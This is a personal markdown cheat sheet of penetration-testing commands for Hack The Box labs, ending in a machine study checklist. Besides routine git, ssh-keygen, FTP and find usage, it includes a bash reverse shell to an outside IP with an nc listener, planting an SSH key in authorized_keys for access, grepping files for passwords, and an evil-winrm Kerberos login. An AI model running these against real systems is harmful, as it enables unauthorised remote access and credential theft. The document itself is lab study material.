### Recover a swap file.
```
vim -e -s -c 'recover .filename.swp' -c 'w newfilename.txt' -c 'q'   
```
### Nmap Cool
```
batcat Voleur_service_allTCP.nmap -l ruby
```
### Some Git Commands
```
cd /tmp
mkdir git-test
cd git-test

echo 'original' > test.txt
```

```
git init
git add test.txt
git commit -m initial
echo 'modified' > test.txt
git diff > test.patch
```

To restore a file:
```
git checkout -- test.txt
```
### SSH
Genereate SSH Key:
```
ssh-keygen
```
Check data or validate an id_rsa key (SSH Key)
```
ssh-keygen -y -f id_rsa
```

### Get a stable shell
```
bash -c "bash -i >& /dev/tcp/10.10.15.6/443 0>&1"
```

Listener
```
sudo nc -lvnp 443
```
#### Make a Shell Fully Interactive
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
Then do:
CTRL + Z
stty raw -echo
fg
export TERM=xterm

## SSH Create Keys
```
ssh-keygen -f <name>
```
If you want ssh into a machine, just copy the .pub key and paste it into the .ssh directory and into the authorized_keys, so you can do for instance:
```
webster@webserver:~/.ssh$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAII5jCxNPzCklkWy2t0tJbji8eXTD7McMtBFOs/FJhxMd sara@sara' >> authorized_keys
<8eXTD7McMtBFOs/FJhxMd sara@sara' >> authorized_keys
webster@webserver:~/.ssh$ chmod 600 authorized_keys
```
Don't forget to chmod 600.
## FTP
Recursively download all files from the FTP server:
```
prompt
```
Then do mget:
```
mget *
```

Do lcd to change directory, so you save it in the right directory, but has to be a full path.

## Unzip Commands
```
7z l test.zip
```
add -lst to see details about each file that is compressed into the zip file.
## Find Command
```
find var -type f -exec strings {} \;
```
That executes the string command on a specific directory
```
find var -type f -name "*.ldb"  -exec strings {} \;| grep -i password -A3
```
Find by file type and with .ldb extensions and grep lines that contain password and 3 letters after it (-A3)
## Evil-WinRM
```
proxychains evil-winrm -k -u bob.wood -r windcorp.htb -i hope.windcorp.htb
```
In this case we are using a ccache kerberos ticket, usually stored on /tmp, don't forget to make the neccesary adjustments in /etc/krb5.conf  .... and for the evil-winrm to succeed specify the realm (-r) and the machine name in this case is the DC01  (hope.windcorp.htb)


## Study Plan
### Ippsec Unofficial List
- [x] Forest
- [x] UNion
- [x] Soccer
- [x] Active
- [x] Administrator
- [x] Delivery
- [x] Remote
- [ ] Access
https://app.hackthebox.com/machines/Access?sort_by=created_at&sort_type=desc
- [x] MetaTwo
- [x] Driver
- [x] Trick
- [ ] Shoppy
- [ ] Outdated
- [ ] Agile
- [ ] Pressed
- [ ] LogForge
- [ ] Hospital
- [ ] Blackfield
- [ ] Vintage
- [ ] Reddish
- [ ] Sekhmet


